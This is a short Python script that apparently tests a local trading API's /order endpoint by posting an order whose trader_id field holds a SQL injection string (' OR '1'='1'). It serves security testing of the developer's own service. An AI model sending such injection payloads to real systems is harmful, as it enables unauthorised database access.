
import requests
import json

def simulate_sqli_attack():
    """Simulates a SQL injection attack on the /order endpoint."""
    url = "http://localhost:8000/order"
    headers = {'Content-Type': 'application/json'}
    
    # Malicious payload that mimics a SQL injection attack
    malicious_payload = {
        "order": {
            "id": "malicious_order",
            "trader_id": "' OR '1'='1'",
            "asset": "BTC-USD",
            "type": "buy",
            "amount": 1.0,
            "price": 50000.0
        },
        "signature": "dummy_signature",
        "public_key": "dummy_public_key"
    }

    print(f"Simulating SQLi attack with payload: {malicious_payload}")
    try:
        response = requests.post(url, headers=headers, data=json.dumps(malicious_payload))
        print(f"Server response: {response.status_code} - {response.text}")
    except requests.exceptions.ConnectionError as e:
        print(f"Connection error: {e}")

if __name__ == '__main__':
    simulate_sqli_attack()
